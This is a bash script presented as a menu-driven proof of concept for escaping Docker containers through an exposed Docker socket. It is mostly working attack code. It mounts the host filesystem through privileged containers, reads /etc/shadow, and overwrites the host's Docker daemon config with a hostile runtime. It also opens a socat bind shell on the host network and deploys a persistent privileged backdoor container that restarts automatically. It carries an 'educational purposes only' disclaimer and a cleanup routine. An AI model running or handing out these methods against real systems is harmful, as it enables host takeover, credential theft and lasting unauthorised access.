#!/bin/bash
# Docker Socket Container Escape PoC - EV (Version 2)
# For educational purposes only. Use only in authorized testing environments.

# Exit immediately if a command exits with a non-zero status.
set -e

# --- Configuration ---
# Names for resources that might persist and need cleanup
PERSISTENT_BACKDOOR_NAME="persistent_backdoor_poc"
NETWORK_SIDECAR_NAME="network_escape_poc_sidecar"
SHADOW_IMAGE_NAME="shadow_extract_poc_img"
TEMP_DOCKER_CLI_DIR="$(pwd)/docker_cli_temp"

# --- Helper Functions ---
check_command() {
    command -v "$1" &>/dev/null
}

install_package() {
    local package_name="$1"
    echo "[-] Dependency '$package_name' not found."
    if [ "$(id -u)" -ne 0 ]; then
        echo "[!] Script not running as root. Cannot install packages. Please install '$package_name' manually and re-run."
        return 1 # Return error, let calling function decide to exit
    fi

    echo "[*] Attempting to install '$package_name'..."
    if check_command apt-get; then
        apt-get update -y && apt-get install -y "$package_name"
    elif check_command yum; then
        yum install -y "$package_name"
    elif check_command apk; then
        apk add --no-cache "$package_name"
    else
        echo "[!] Cannot determine package manager (apt, yum, apk) or '$package_name' install failed."
        echo "[!] Please install '$package_name' manually."
        return 1 # Return error
    fi

    if ! check_command "$package_name"; then
        echo "[!] Installation of '$package_name' appears to have failed (command still not found)."
        return 1 # Return error
    fi
    echo "[+] '$package_name' installed successfully."
    return 0 # Success
}

ensure_docker_cli() {
    if check_command docker; then
        echo "[+] Docker CLI is available."
        return 0
    fi

    echo "[-] Docker CLI not found."
    # Check for curl and tar, which are needed for Docker CLI download
    if ! check_command curl; then
        install_package "curl" || exit 1 # Exit if critical dependency curl can't be installed
    fi
    if ! check_command tar; then
        install_package "tar" || exit 1 # Exit if critical dependency tar can't be installed
    fi

    echo "[*] Attempting to download and extract minimal Docker client..."
    mkdir -p "$TEMP_DOCKER_CLI_DIR"
    if curl -fsSL https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz | tar -xz -C "$TEMP_DOCKER_CLI_DIR" docker/docker --strip-components=1; then
        if [ -f "$TEMP_DOCKER_CLI_DIR/docker" ]; then
            export PATH="$PATH:$TEMP_DOCKER_CLI_DIR"
            echo "[+] Docker CLI downloaded to '$TEMP_DOCKER_CLI_DIR' and added to PATH for this session."
            if ! docker --version &>/dev/null; then
                echo "[!] Downloaded Docker CLI is not working. Please check compatibility or install manually."
                rm -rf "$TEMP_DOCKER_CLI_DIR" # Clean up failed download
                exit 1
            fi
            echo "[+] Docker CLI is now available."
        else
            echo "[!] Failed to extract Docker CLI. Please install it manually."
            rm -rf "$TEMP_DOCKER_CLI_DIR" # Clean up failed download
            exit 1
        fi
    else
        echo "[!] Failed to download or extract Docker CLI. Please install it manually."
        rm -rf "$TEMP_DOCKER_CLI_DIR" # Clean up failed download
        exit 1
    fi
}

# --- Escape Method Functions ---

method_1_basic_escape() {
    echo "[+] Executing: Basic privileged container escape (Method 1)"
    echo "[*] Creating a new privileged container with host filesystem mounted..."
    docker run -it --rm \
        --privileged \
        --pid=host \
        --network=host \
        -v /:/hostfs \
        alpine:latest \
        chroot /hostfs /bin/sh -c \
        "echo '[SUCCESS] Escaped! Now running on the host with root privileges.'; \
         echo '--- Host Information ---'; \
         echo 'Hostname: \$(hostname)'; \
         echo 'User: \$(id)'; \
         echo 'Processes (example):'; ps aux | head -n 5; \
         echo 'Root directory listing:'; ls -la / | head -n 10; \
         echo '--- End Host Information ---'; \
         echo '[*] This is a PoC. An attacker could now establish persistence.'"
}

method_2_daemon_config_exploit() {
    echo "[+] Executing: Docker daemon configuration exploit (Method 2)"
    local malicious_config_content='{
"runtimes": {
  "poc_runtime": {
    "path": "/bin/sh",
    "runtimeArgs": ["-c", "echo POC_RUNTIME_TRIGGERED_ON_HOST > /tmp/poc_runtime.txt && id > /tmp/poc_runtime_id.txt"]
  }
}
}'
    local temp_daemon_json_path="/tmp/poc_daemon.json" # File within this attacker container

    echo "$malicious_config_content" > "$temp_daemon_json_path"
    echo "[*] Malicious daemon config content prepared locally at '$temp_daemon_json_path'."

    echo "[*] Attempting to overwrite host's /etc/docker/daemon.json..."
    # This new container writes the predefined content to the host's daemon.json
    docker run --rm \
        -v /etc/docker:/host_etc_docker \
        alpine:latest \
        sh -c "echo '${malicious_config_content}' > /host_etc_docker/daemon.json && \
                 echo '[SUCCESS] Malicious daemon.json deployed to host at /host_etc_docker/daemon.json.'"
    
    echo "[*] Content written to host's /etc/docker/daemon.json (requires Docker daemon restart):"
    docker run --rm -v /etc/docker:/host_etc_docker alpine:latest sh -c "echo '--- Host /etc/docker/daemon.json ---'; cat /host_etc_docker/daemon.json; echo '--- End Content ---'"
    
    echo "[!] IMPORTANT: The Docker daemon on the HOST must be restarted for these changes to take effect."
    echo "[!] After restart, a container could be run with: docker run --runtime=poc_runtime alpine:latest /bin/true"
    echo "[!] Check for /tmp/poc_runtime.txt and /tmp/poc_runtime_id.txt on the host after test."
    rm -f "$temp_daemon_json_path" # Clean up local temp file
}

method_3_custom_capabilities() {
    echo "[+] Executing: Create container with custom capabilities (Method 3)"
    echo "[*] Creating a new container with SYS_ADMIN capability..."
    docker run -it --rm \
        --cap-add=SYS_ADMIN \
        --security-opt apparmor=unconfined \
        --security-opt seccomp=unconfined \
        alpine:latest sh -c \
        "echo '[*] Inside container with SYS_ADMIN capability.'; \
         echo '[*] Attempting to mount host root filesystem to /tmp/host_on_guest...'; \
         mkdir -p /tmp/host_on_guest; \
         if mount -o bind / /tmp/host_on_guest; then \
             echo '[SUCCESS] Host filesystem mounted at /tmp/host_on_guest.'; \
             echo '--- Host / (first 10 lines) ---'; \
             ls -la /tmp/host_on_guest | head -n 10; \
             echo '--- End Listing ---'; \
             echo '[*] Unmounting /tmp/host_on_guest...'; \
             umount /tmp/host_on_guest; \
         else \
             echo '[-] Failed to mount host filesystem. This might be restricted by other security layers.'; \
         fi"
}

method_4_host_network_sidecar() {
    echo "[+] Executing: Deploy sidecar container with host network (Method 4)"
    echo "[*] Deploying sidecar container '$NETWORK_SIDECAR_NAME' on host network..."
    docker run -d \
        --network=host \
        --name "$NETWORK_SIDECAR_NAME" \
        alpine:latest \
        sh -c "echo '[Sidecar-$NETWORK_SIDECAR_NAME] Installing socat...'; \
                apk add --no-cache socat; \
                echo '[Sidecar-$NETWORK_SIDECAR_NAME] Starting socat listener on TCP port 45678 (host network)...'; \
                socat TCP-LISTEN:45678,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,echo=0"
    
    echo "[SUCCESS] Sidecar container '$NETWORK_SIDECAR_NAME' deployed in detached mode."
    echo "[*] It is listening on port 45678 on ALL host network interfaces."
    echo "[*] To connect (e.g., from host or another machine on the network): nc <host_ip> 45678"
    echo "[*] This container will be cleaned up if you choose the cleanup option later."
}

method_5_api_command_on_host() {
    echo "[+] Executing: Exploit Docker API to run command on host (Method 5)"
    echo "[*] Creating a temporary privileged container to run commands on the host via chroot..."
    docker run --rm -it \
        --privileged \
        -v /:/hostfs_cmd_exec \
        alpine:latest \
        chroot /hostfs_cmd_exec /bin/sh -c \
        "echo '[SUCCESS] Executing command directly on the host (via chroot into mounted host root):'; \
         echo '--- Host Command Output ---'; \
         echo 'Hostname: \$(hostname)'; \
         echo 'User ID: \$(id)'; \
         echo 'Uptime: \$(uptime)'; \
         echo 'Mounted filesystems (df -h /):'; df -h /; \
         echo '--- End Host Command Output ---'"
}

method_6_build_context_files() {
    echo "[+] Executing: Use Docker image build context to access host files (Method 6)"
    echo "[*] Preparing to build an image ('$SHADOW_IMAGE_NAME') using host's root ('/') as build context..."
    
    # Dockerfile content is passed via stdin to docker build
    local dockerfile_content=$(cat <<EOF
FROM alpine:latest
# COPY a sensitive file from the build context (host's root) into the image
# Example: /etc/shadow (requires root on host to read this file during build)
COPY /etc/shadow /tmp/host_shadow_file_in_image
COPY /etc/hostname /tmp/host_hostname_in_image

CMD sh -c 'echo "[SUCCESS] Inside container built from $SHADOW_IMAGE_NAME"; \
           echo "--- Host /etc/shadow (first 5 lines, if accessible during build) ---"; \
           cat /tmp/host_shadow_file_in_image | head -n 5; \
           echo "--- Host /etc/hostname ---"; \
           cat /tmp/host_hostname_in_image; \
           echo "--- End Extracted Files ---"; \
           echo "[*] Host files extracted via build context."'
EOF
)

    echo "[*] Building image '$SHADOW_IMAGE_NAME' with Dockerfile from stdin..."
    # The '-' for -f means read Dockerfile from stdin.
    # The '/' at the end specifies the build context path on the host.
    echo "$dockerfile_content" | docker build -t "$SHADOW_IMAGE_NAME" -f - /

    echo "[*] Running container from image '$SHADOW_IMAGE_NAME' to display extracted file(s)..."
    docker run --rm "$SHADOW_IMAGE_NAME"
    
    echo "[+] PoC for image build context exploit complete."
    echo "[*] Image '$SHADOW_IMAGE_NAME' was created. It will be cleaned up if you choose that option."
}

method_7_volume_mount_abuse() {
    echo "[+] Executing: Abuse volume mounts to access sensitive host paths (Method 7)"
    echo "[*] Creating a temporary container with sensitive host paths mounted (read-only for safety in PoC)..."
    docker run --rm -it \
        -v /:/host_root_ro:ro \
        -v /etc/shadow:/mounted_shadow_ro:ro \
        -v /root:/host_actual_root_dir_ro:ro \
        alpine:latest sh -c \
        "echo '[SUCCESS] Accessed sensitive host paths via volume mounts:'; \
         echo '--- Host /etc/shadow (first 5 lines from /mounted_shadow_ro) ---'; \
         cat /mounted_shadow_ro | head -n 5; \
         echo '--- Listing of host /root (from /host_actual_root_dir_ro, if readable) ---'; \
         ls -la /host_actual_root_dir_ro; \
         echo '--- Listing of host / (from /host_root_ro, first 10 lines) ---'; \
         ls -la /host_root_ro | head -n 10; \
         echo '[*] An attacker could mount /home, /root/.ssh, config files, etc.'"
}

method_8_host_pid_namespace() {
    echo "[+] Executing: Deploy container in host PID namespace (Method 8)"
    echo "[*] Creating a temporary privileged container in host's PID namespace..."
    docker run --rm -it \
        --pid=host \
        --privileged \
        alpine:latest sh -c \
        "echo '[SUCCESS] Running in host PID namespace. Can see all host processes:'; \
         echo '--- Host Processes (examples like dockerd, sshd, init/systemd) ---'; \
         ps aux | grep -E 'dockerd|sshd|systemd|init' | grep -v 'grep' | head -n 10; \
         echo '--- Top 5 CPU consuming processes on host ---'; \
         ps aux --sort=-%cpu | head -n 6; \
         echo '[!] With --privileged, an attacker could interact with these processes (e.g., gdb, strace, /proc/[pid]/mem).'"
}

method_9_privileged_exec() {
    echo "[+] Executing: Exploit Docker API to create privileged exec session (Method 9)"
    local target_container_name="exec_target_poc_$(date +%s)"
    local temp_mount_in_exec="/tmp/host_fs_via_exec"

    echo "[*] Creating a simple, non-privileged target container: '$target_container_name'..."
    docker run -d --name "$target_container_name" alpine:latest sleep 300 # Keep alive for 5 mins

    echo "[*] Creating a privileged exec session into '$target_container_name'..."
    # The --privileged flag on 'docker exec' grants escalated privileges to the exec'd process
    docker exec -it --privileged "$target_container_name" sh -c \
        "echo '[SUCCESS] Inside privileged exec session in container \"$target_container_name\"'; \
         echo '[*] Attempting to mount host root filesystem to \"$temp_mount_in_exec\"...'; \
         mkdir -p \"$temp_mount_in_exec\"; \
         if mount -o bind / \"$temp_mount_in_exec\"; then \
             echo '[+] Host filesystem successfully mounted at \"$temp_mount_in_exec\"'; \
             echo '--- Host /root directory (listing from exec session) ---'; \
             ls -la \"${temp_mount_in_exec}/root\"; \
             echo '[*] Unmounting host filesystem...'; \
             umount \"$temp_mount_in_exec\"; \
         else \
             echo '[-] Failed to mount host filesystem via privileged exec.'; \
         fi; \
         echo '[+] Privileged exec session finished.'"
    
    echo "[*] Cleaning up target container '$target_container_name'..."
    docker rm -f "$target_container_name"
    echo "[+] PoC for privileged exec session exploit complete."
}

method_10_persistent_backdoor() {
    echo "[+] Executing: Full system compromise demonstration (persistent backdoor container - Method 10)"
    echo "[*] Deploying persistent backdoor container '$PERSISTENT_BACKDOOR_NAME'..."
    docker run -d \
        --restart=always \
        --privileged \
        --pid=host \
        --network=host \
        --name "$PERSISTENT_BACKDOOR_NAME" \
        -v /:/host_root_mount \
        alpine:latest sh -c \
        "echo '[Sidecar-$PERSISTENT_BACKDOOR_NAME] Persistent privileged container started.'; \
         echo '[Sidecar-$PERSISTENT_BACKDOOR_NAME] Installing utilities (socat, openssh-client)...'; \
         apk add --no-cache socat openssh-client; \
         echo '[Sidecar-$PERSISTENT_BACKDOOR_NAME] Utilities installed. Full host access at /host_root_mount.'; \
         echo '[Sidecar-$PERSISTENT_BACKDOOR_NAME] Ready for further commands. Keeping container alive...'; \
         tail -f /dev/null"
    
    echo "[SUCCESS] Persistent backdoor container '$PERSISTENT_BACKDOOR_NAME' deployed."
    echo "[*] It has full access to the host system (mounted at /host_root_mount within the container)."
    echo "[*] To access it: docker exec -it \"$PERSISTENT_BACKDOOR_NAME\" sh"
    echo "[*] This container is set to --restart=always and will be cleaned up if you choose that option."
}

# --- Cleanup Function ---
cleanup() {
    echo ""
    echo "[!] Initiating cleanup of PoC resources..."
    
    echo "[*] Removing known containers (if they exist)..."
    docker rm -f "$PERSISTENT_BACKDOOR_NAME" "$NETWORK_SIDECAR_NAME" 2>/dev/null || echo "[-] No persistent PoC containers to remove or already removed."
    
    echo "[*] Removing known images (if they exist)..."
    docker rmi "$SHADOW_IMAGE_NAME" 2>/dev/null || echo "[-] PoC image '$SHADOW_IMAGE_NAME' not found or already removed."

    echo "[*] Removing temporary files created by this script..."
    rm -f /tmp/poc_daemon.json # Used by method 2 locally
    if [ -d "$TEMP_DOCKER_CLI_DIR" ]; then
        echo "[*] Removing temporary Docker CLI download directory: '$TEMP_DOCKER_CLI_DIR'..."
        rm -rf "$TEMP_DOCKER_CLI_DIR"
    fi
    
    echo "[+] Cleanup attempt completed. Review output for any manual steps if needed."
}


# --- Main Script Logic ---
echo "[*] Docker Socket Container Escape - Enhanced PoC (Version 2)"
echo "[*] Disclaimer: For educational and authorized testing only."
echo "---------------------------------------------------------------------"

echo "[*] Step 1: Checking for Docker socket..."
if [ ! -S /var/run/docker.sock ]; then
    echo "[-] CRITICAL: Docker socket not found at /var/run/docker.sock. Container is not vulnerable via this vector."
    exit 1
fi
echo "[+] Docker socket found. Container may be vulnerable."
echo "---------------------------------------------------------------------"

echo "[*] Step 2: Ensuring Docker CLI is available..."
ensure_docker_cli # This will exit if Docker CLI cannot be made available
echo "---------------------------------------------------------------------"

# Display menu of escape methods
echo ""
echo "Available escape methods:"
echo " 1. Basic privileged container escape (mount host filesystem)"
echo " 2. Docker daemon configuration exploit (write to daemon config, restart host Docker)"
echo " 3. Create container with custom capabilities (SYS_ADMIN to mount host fs)"
echo " 4. Deploy sidecar container with host network (e.g., for network listener)"
echo " 5. Exploit Docker API to run command on host (via privileged chroot container)"
echo " 6. Use Docker image build context to access host files (e.g., /etc/shadow)"
echo " 7. Abuse volume mounts to access sensitive host paths directly"
echo " 8. Deploy container in host PID namespace (view all host processes)"
echo " 9. Exploit Docker API to create privileged exec session into a container"
echo "10. Full system compromise (deploy persistent privileged backdoor container)"
echo ""
read -p "Select escape method (1-10, or 'q' to quit): " method_choice

echo "---------------------------------------------------------------------"

case "$method_choice" in
    1) method_1_basic_escape ;;
    2) method_2_daemon_config_exploit ;;
    3) method_3_custom_capabilities ;;
    4) method_4_host_network_sidecar ;;
    5) method_5_api_command_on_host ;;
    6) method_6_build_context_files ;;
    7) method_7_volume_mount_abuse ;;
    8) method_8_host_pid_namespace ;;
    9) method_9_privileged_exec ;;
    10) method_10_persistent_backdoor ;;
    q|Q) echo "[*] Quitting PoC script."; exit 0 ;;
    *) echo "[-] Invalid option. Exiting."; exit 1 ;;
esac

echo "---------------------------------------------------------------------"
echo "[+] PoC method execution completed."

read -p "Do you want to run cleanup for PoC resources now? (yes/no): " run_cleanup
if [ "$run_cleanup" == "yes" ]; then
    cleanup
else
    echo "[*] Cleanup skipped. Remember to manually clean up any created resources:"
    echo "    docker rm -f \"$PERSISTENT_BACKDOOR_NAME\" \"$NETWORK_SIDECAR_NAME\""
    echo "    docker rmi \"$SHADOW_IMAGE_NAME\""
    echo "    Manually remove '$TEMP_DOCKER_CLI_DIR' if it exists."
    echo "    If you ran Method 2, remember to revert /etc/docker/daemon.json on the host and restart Docker."
fi
echo "---------------------------------------------------------------------"
echo "[*] Script finished."